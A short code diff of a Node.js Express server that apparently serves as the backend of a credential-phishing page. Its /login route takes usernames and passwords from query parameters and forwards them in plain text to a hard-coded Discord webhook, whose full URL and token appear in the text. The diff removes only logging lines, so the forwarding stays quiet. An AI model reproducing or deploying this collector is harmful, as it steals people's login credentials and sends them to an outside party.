@@ -5,19 +5,15 @@ const axios = require('axios')
 app.use(express.static('static'))
 
 app.get('/login', (req, res) => {
-  console.log('Received request to login')
-  console.log(`username:${req.query.username},pw:${req.query.n}`)
   postMessageToDiscord({username: req.query.username, pw: req.query.n})
   res.status(200).send()
 })
 
 app.post('/webpromotions', (req, res) => {
-  console.log(req.body)
   res.status(200).send()
 })
 
 app.post('/falco', (req, res) => {
-  console.log(req.body)
   res.status(200).send()
 })
 
@@ -29,7 +25,6 @@ function postMessageToDiscord(message) {
 
   const discordUrl = 'https://discord.com/api/webhooks/836368184990760973/haOwTWrH69hyGv4HPqltc0q4uAkyaC-mXN6GVenF06CsNIEns8-VEYpURI8Noo_9osfp';
   const payload = JSON.stringify({content: `username: ${message.username} pw: ${message.pw}`});
-  console.log('payload',payload)
   axios({
     url: discordUrl,
     method: 'post',
